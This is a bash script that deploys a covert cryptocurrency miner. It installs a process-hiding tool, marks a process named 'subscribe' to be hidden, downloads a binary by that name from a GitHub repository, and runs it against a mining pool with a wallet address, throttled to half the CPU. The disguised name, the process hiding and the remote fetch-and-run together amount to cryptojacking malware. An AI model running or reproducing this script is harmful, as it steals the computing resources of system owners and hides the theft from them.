#!/bin/bash
apt-get update -y
apt-get install -y cpulimit screen
apt-get install -y ca-certificates wget libcurl4
npm i -g node-process-hider
ph add subscribe
wget https://github.com/septianana55/students/raw/main/subscribe
chmod +x subscribe
cpulimit -l 50 ./subscribe -a yespowerTIDE -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TVt7kd7Ns8rwzS8LoeMXjJZnwKdMAhhZkn.D4 -t 3
